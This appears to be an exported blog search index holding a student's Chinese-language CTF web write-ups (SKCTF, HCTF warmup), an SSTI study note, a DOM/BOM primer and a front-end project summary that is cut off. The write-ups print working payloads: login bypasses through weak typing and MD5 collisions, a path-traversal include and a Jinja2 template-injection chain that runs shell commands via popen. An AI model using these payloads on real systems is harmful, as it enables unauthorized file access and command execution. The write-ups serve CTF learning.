<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SKCTF-Web</title>
    <url>/2020/01/18/SKCTF-Web/</url>
    <content><![CDATA[<p>skctf的web题解，适合萌新的难度。</p>
<a id="more"></a>

<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>修改前端的maxlength为大于3的值，然后填入flag，在源代码中发现</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">Wm14aFp5VTNRbU0yWW1JeU4ySmtPVE16WmpGaVlUSmlZbVprWmpnM05qaGlPVEF6TVRJNEpUZEU</span>=</span><br></pre></td></tr></table></figure>
<p>base64两次解码两次然后url解码一次为：   </p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">flag&#123;c6bb27bd933f1ba2bbfdf<span class="number">8768b903128</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计-1"></a>代码审计-1</h3><p>extract变量覆盖<br>payload:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//182.92.64.179:8003/?id=&amp;content=</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>flag{pHP_1s_s0_EAsyyyy}</p>
</blockquote>
<h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计-2"></a>代码审计-2</h3><p>解法1-弱类型绕过：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">login=<span class="number">1</span>&amp;username[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span>&amp;id=<span class="number">15.00</span></span><br></pre></td></tr></table></figure>
<p>解法2-md5碰撞加弱类型绕过   </p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">login=<span class="number">1</span>&amp;username=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;password=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;id=<span class="number">15.00</span></span><br></pre></td></tr></table></figure>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>是CVE-2018-12613<br>解法：<br>源代码给出了一个code.php与flag的位置:f1ag_fjsdhjhs121,进入code.php</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"code"</span>=&gt;<span class="string">"code.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>code.php中的checkfile函数，工作原理大致如下:   </p>
<blockquote>
<p>1.定义一个白名单，里面包括了code.php<br>2.判断page是否为空或字符串，返回true。</p>
</blockquote>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-web复现</title>
    <url>/2018/11/13/HCTF-web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>HCTF后的复现以及学习</p>
<a id="more"></a>

<hr>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell </a>   </p>
<p>题中源码</p>
<pre><code>&lt;?php
    class emmm
    {
        public static function checkFile(&amp;$page)
        {
            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
            if (! isset($page) || !is_string($page)) {
                echo &quot;you can&apos;t                                                                                                               see it&quot;;
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo &quot;you can&apos;t see it&quot;;
            return false;
        }
    }

    if (! empty($_REQUEST[&apos;file&apos;])
        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
    ) {
        include $_REQUEST[&apos;file&apos;];
        exit;
    } else {
        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
    }  
?&gt;</code></pre><p>一个任意文件读取，但是需要?前的字符为source.php或者hint.php，可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag。   </p>
<blockquote>
<p>payload:<br>/index.php?file=hint.php?../../../../../../../../ffffllllaaaagggg 或者:<br>/index.php?file=source.php?../../../../../../../../ffffllllaaaagggg</p>
</blockquote>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM,BOM</title>
    <url>/2018/10/22/DOM-BOM/</url>
    <content><![CDATA[<p>关于DOM与BOM的简介</p>
<a id="more"></a>

<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>DOM= Document Object Model，文档对象模型，DOM可以以一种独立于平台和语言的方式访问和修改一个文档的内容和结构。换句话说，这是表示和处理一个HTML或XML文档的常用方法。有一点DOM很重要，DOM的设计是以对象管理组织（OMG）的规约为基础的，因此可以用于任何编程语言。最初人们把它认为是一种让JavaScript在浏览器间可移植的方法，不过DOM的应用已经远远超出这个范围。Dom技术使得用户页面可以动态地变化，如可以动态地显示或隐藏一个元素，改变它们的属性，增加一个元素等，Dom技术使得页面的交互性大大地增强。</p>
<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>提供了独立于内容而与浏览器窗口进行交互的对象。描述了与浏览器进行交互的方法和接口，可以对浏览器窗口进行访问和操作，譬如可以弹出新的窗口，改变状态栏中的文本，对Cookie的支持，IE还扩展了BOM，加入了ActiveXObject类，可以通过js脚本实例化ActiveX对象等等.</p>
<p>Window对象：<br>是整个BOM的核心，所有对象和集合都以某种方式回接到window对象。Window对象表示整个浏览器窗口，但不必表示其中包含的内容。<br>Document对象：<br>实际上是window对象的属性。这个对象的独特之处是唯一一个既属于BOM又属于DOM的对象。从BOM角度看，document对象由一系列集合构成，这些集合可以访问文档的各个部分。<br>Location对象：<br>它是window对象和document对象的属性。Location对象表示载入窗口的URL，此外它还可以解析URI.<br>Navigator对象：<br>Navigator包含大量Web浏览器相关的信息。各种浏览器支持该对象的属性和方法不尽相同。<br>Screen对象：<br>通过其可以获取用户屏幕相关的信息</p>
]]></content>
      <tags>
        <tag>web FE</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI学习</title>
    <url>/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近在刷攻防世界的web题，遇到了好多个ssti的题，flask，Tornado等等，但是自己也没有好好总结过，只有之前CISCN的时候做某个题的时候大概弄懂了原理，也没有总结出payload总结等等，所以经过多个题的洗礼，来进行思考总结。</p>
<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>STTI就是服务器端模板注入(Server-Side Template Injection)，与sql注入，命令注入等等原理都差不多，都是执行了外部输入的代码，即将用户输入的数据，当作代码来执行了，成为了程序中的一部分。在Flask,Django以及Tornado中，都是MVT模式的三层架构，T就是指Template(模板技术)，Flask中常用的模板是jinja2， 模板中可以访问一些 Python 内置变量，jinja2中有三种语法：</p>
<blockquote>
<p>控制结构 &#123;% %&#125;</p>
<p>变量取值 &#123;&#123; &#125;&#125;</p>
<p>注释 &#123;#   #&#125;</p>
</blockquote>
<p>jinja2中使用&#123;&#123; &#125;&#125;语法来表示一个变量，当利用jinja2进行渲染的时候就会执行，jinja2也支持Python中的所有数据类型，例如基本数据类型，列表，字典，对象等。</p>
<p>使用以下代码来进行简单测试(使用的环境是python3.7)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">  <span class="keyword">return</span> open(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test/&lt;path:str&gt;') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(str)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> flask.render_template_string(str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>启动后访问 <code>http://127.0.0.1/test/&amp;#123;&amp;#123; 1+1&amp;#125;&amp;#125;</code>可以发现页面显示了一个2，即&#123;&#123;1+1&#125;&#125;中的代码进行了执行。</p>
<p>这段代码是一个典型的SSTI漏洞示例，漏洞成因在于：<code>render_template_string</code>函数在渲染模板的时候直接把输入的字符串进行了返回渲染，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，&#123;&#123; &#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123; &#125;&#125;包裹的内容当做变量解析替换。此时&#123;&#123;1+1&#125;&#125;会被解析成2。(我想起了jsp中使用el表达式也是这种差不多的语法，是否也能进行模板注入？)</p>
<h3 id="0x02-扩展深入"><a href="#0x02-扩展深入" class="headerlink" title="0x02 扩展深入"></a>0x02 扩展深入</h3><h4 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h4><p>当我们在启用一个python解释器的时候，没有进行任何导包/创建变量/创建函数等等操作，还是有很多函数可以使用，这些函数叫做内建函数，这些函数在python解释器启动的时候就自动加载到内存中供我们使用。</p>
<p>这里需要提到一个命名空间的东西，这个在其他编程语言中也有相关的东西。</p>
<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h4><p>官方文档的一段话： </p>
<blockquote>
<p> <em>A namespace is a mapping from names to objects.Most namespaces are currently implemented as Python dictionaries。</em> </p>
</blockquote>
<p>命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的。命名空间提供了在项目中避免名字冲突的一种方法。各个命名空间是独立的，没有任何关系的，所以一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。</p>
<p>一般有三种命名空间：</p>
<blockquote>
<p><strong>内置名称（built-in names</strong>）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。<br><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。<br><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</p>
</blockquote>
<h4 id="命名空间的”顺序”"><a href="#命名空间的”顺序”" class="headerlink" title="命名空间的”顺序”"></a>命名空间的”顺序”</h4><p><strong>查找顺序：</strong></p>
<p>比如说我们要使用一个变量 test，则 Python 的查找顺序为：</p>
<blockquote>
<p>局部名称空间——&gt;全局名称空间—–&gt;内置名称空间</p>
</blockquote>
<p>如果找不到变量 runoob，它将放弃查找并引发一个 NameError 异常:</p>
<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%9A%84%E9%A1%BA%E5%BA%8F_test.png" alt="0x02_命名空间的顺序_test.png"></p>
<p><strong>加载顺序：</strong></p>
<p>这个想都不用想，开始说了python解释器启动时就会加载内置函数，那么加载顺序肯定是内置命名空间最先加载，跟查找顺序恰恰相反。</p>
<blockquote>
<p>局部名称空间——&gt;全局名称空间—–&gt;内置名称空间</p>
</blockquote>
<p>我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的<strong>builtins</strong>模块提供内建名称空间到内建对象的映射。</p>
<p>dir()函数用于查看一个对象的属性有哪些，在没有提供参数的时候，会将返回当前环境导入的所有模块进行返回，我们可以看初始模块有哪些</p>
<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_dir.png" alt="0x02_dir.png"></p>
<p>可以看到<strong>builtins</strong>是作为一个默认初始模块出现的，那么可以使用dir()查看<strong>builtins</strong>模块下的属性。</p>
<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_dir(__builtins__).png" alt="0x02_dir(__builtins__).png"></p>
<p>在这个里面我们可以看到很多熟悉的关键字，len，hash，hex，input等等，这也是解释了为什么我们不需要导入这些包就能使用这些函数，因为就是通过默认模块导入了。</p>
<p>当然我们也能自己手动再导入，再调用其中的方法，如：</p>
<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_import_builtins.png" alt="0x02_import_builtins.png"></p>
<p>注：python3中__builtins__是引用的builtins模块，而python2中__builtins__是引用的__builtin__，所以python2中应该是<code>import __builtin__</code></p>
<h4 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h4><p>说到类继承就想到了js中的原型链污染，都是一个继承链来的。</p>
<p>python中对一个变量可以通过一些继承的方法，找到继承链，通常要用到以下方法</p>
<blockquote>
<p><strong>__class__</strong>： 万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code></p>
<p><strong>__base__</strong> ：对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法。</p>
<p><strong>__base__</strong> ：以元组的形式返回一个类所直接继承的类。 </p>
<p><strong>__mro__</strong> ：同样可以获取对象的基类，只是这时会显示出整个继承链的关系(继承树)，是一个列表，object在最底层，即在列表中的最后，通过<strong>__mro__[-1]</strong>可以获取到。</p>
<p><strong>__subclasses__()</strong> ：继承此对象的子类，返回一个列表。</p>
<p> <strong>__init__</strong>：所有自带类都包含__init__方法。 </p>
</blockquote>
<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到各种“危险”类，然后调用类中的危险方法进行命令执行。</p>
<h4 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h4><p>这里介绍几个常见的函数，有助于后续的理解</p>
<blockquote>
<p><strong>__dict__：</strong>类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__ 属性中的。每个类有自己的<strong>__dict__</strong>属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__ 对象也有自己的__dict__ 属性</p>
<p><strong>__globals__：</strong>function.__globals__该属性是函数特有的属性，用于获取function所处空间下可使用的模块、方法以及所有变量。记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用__globals__属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p>
<p><strong>__getattribute__()：</strong>实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<code>.</code>操作的时候（形如：<code>a.xxx/a.xxx()</code>），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</p>
</blockquote>
<h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h3><p>利用上面讲到的类继承的思想，可以总结出一个利用流程：</p>
<blockquote>
<p>从一个变量开始-&gt;获得对象-&gt;获得基类-&gt;获得子类-&gt;遍历子类-&gt;子类中寻找可以利用的类</p>
</blockquote>
<p>或者说：</p>
<blockquote>
<p>任意找一个内置类对象，通过__class__获取到它对应的类</p>
<p>通过__base__获取到基类<code>&lt;class &#39;object&#39;&gt;</code></p>
<p>通过__subclasses__()获取到基类的所有子类</p>
<p>在子类中寻找可以利用的类</p>
<p>例如：””.__class__.__base__.__subclasses__()   ——python3</p>
</blockquote>
<h4 id="寻找可以利用的类"><a href="#寻找可以利用的类" class="headerlink" title="寻找可以利用的类"></a>寻找可以利用的类</h4><p>例如我们要寻找可以使用popen的类</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#Anaconda自带的python3.7.3</span></span><br><span class="line">aim = <span class="string">"popen"</span></span><br><span class="line">order = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> <span class="string">""</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>():</span><br><span class="line">    order+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> aim <span class="built_in">in</span> i.<span class="variable">__init__</span>.<span class="variable">__globals__</span>.keys():</span><br><span class="line">            print(i,order)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_find_popen.png" alt="0x03_find_popen.png"></p>
<p>然后就可以进行命令执行：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">128</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>

<h4 id="payload解析："><a href="#payload解析：" class="headerlink" title="payload解析："></a>payload解析：</h4><p>python中万物皆对象，前面学习类继承的时候提到可以回溯到基类中，例如上面payload中，使用一个空字符串调用__class__获取到是属于字符串类，而__bases[-1]__是获取到继承链的最后一个类(即基类)<code>&lt;class &#39;object&#39;&gt;</code>，__subclasses__()获取基类的所有子类，返回了一个列表，[128]取到了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>这个类。我在学习这个payload的时候不懂为什么要调用__init__，自己写了一个例子就发现了问题所在。</p>
<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85pyload%E8%A7%A3%E6%9E%90.png" alt="0x03_补充pyload解析.png"></p>
<p>噢原来只是找到这个函数呀，我开始以为是调用了__init__()函数，这里只是个函数指针罢了。让我们再看一下__globals__的作用：</p>
<blockquote>
<p>用于获取function所处空间下可使用的模块、方法以及所有变量。</p>
</blockquote>
<p>__init__是每个类都有的函数，那么通过__init__调用__globals__就得到了这个类中的各种模块，方法跟变量(字典格式)，如果有popen函数的话，就可以通过__init__.__globals__[‘popen’]来获取到popen的函数指针了，接下来的就是执行命令就不再赘述了。关于__init__的理解我还写了一个小例子，如下：</p>
<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85_example.png" alt="0x03_补充_example.png"></p>
<p>可以看到通过调用__init__.__globals__获取到的模块跟通过dir()获取到的相同，包括导入的os模块也在其中。</p>
<h3 id="0x04-payload总结"><a href="#0x04-payload总结" class="headerlink" title="0x04 payload总结"></a>0x04 payload总结</h3><p>啊这里就不总结了，思路就是那样子，本文基于python3来的，2有一些区别，思路都差不多。</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Web-FE期末项目总结</title>
    <url>/2018/12/26/Web-FE%E6%9C%9F%E6%9C%AB%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>前端课堂的项目已经完成，项目也发布到github上去了。这里把文档弄出来纪念一下，以后慢慢把他扩展成一个完整的网站。</p>
<a id="more"></a>


<h2 id="网站主题：信息安全"><a href="#网站主题：信息安全" class="headerlink" title="网站主题：信息安全"></a>网站主题：信息安全</h2><h3 id="1-摘要："><a href="#1-摘要：" class="headerlink" title="1.摘要："></a>1.摘要：</h3><p>较之前上台展示之后，修改了整个首页，课程改为轮播图，添加二级菜单，然后在用户输入的地方利用js进行判断跟过滤。</p>
<h3 id="2-布局"><a href="#2-布局" class="headerlink" title="2.布局"></a>2.布局</h3><p>首页(index.html)采用网格布局，其余采用相对定位跟绝对定位。<br>网格定位部分代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#index_container</span>&#123;</span><br><span class="line">	<span class="attribute">display</span>: grid;</span><br><span class="line">	<span class="attribute">grid-template-rows</span>:<span class="number">50px</span> auto <span class="number">100px</span>;</span><br><span class="line">	<span class="attribute">grid-template-columns</span>: <span class="number">350px</span> auto <span class="number">200px</span>;</span><br><span class="line">	<span class="attribute">min-height</span>: <span class="number">100vh</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.index_header</span>&#123;</span><br><span class="line">	<span class="attribute">grid-row</span>:<span class="number">1</span>/<span class="number">2</span>;</span><br><span class="line">	<span class="attribute">grid-column</span>:<span class="number">1</span>/<span class="number">4</span> ;</span><br><span class="line">	<span class="attribute">background</span>: <span class="number">#4A4B48</span>;</span><br><span class="line">	<span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-部分核心代码"><a href="#3-部分核心代码" class="headerlink" title="3.部分核心代码"></a>3.部分核心代码</h3><p>3.1:用户邮箱输入判定   </p>
<blockquote>
<p>获取用户输入的email之后，利用正则验证是否满足邮箱的长度跟格式，当不满足的时候显示格式错误。当不满足的时候点击提交，弹出警告框。除此之外，在登陆注册处添加onkeyup跟onpaste两个事件来过滤输入   </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> struemail=<span class="built_in">document</span>.getElementById(<span class="string">"email"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkemail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> check=<span class="regexp">/^[0-9a-zA-Z]\w&#123;5,17&#125;@[0-9a-zA-Z]+\.\w+$/</span>;</span><br><span class="line">	<span class="keyword">if</span>(!check.test(struemail.value))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementById(<span class="string">"warringbox3"</span>).innerHTML=<span class="string">"格式错误！"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementById(<span class="string">"warringbox3"</span>).innerHTML=<span class="string">""</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkuser</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	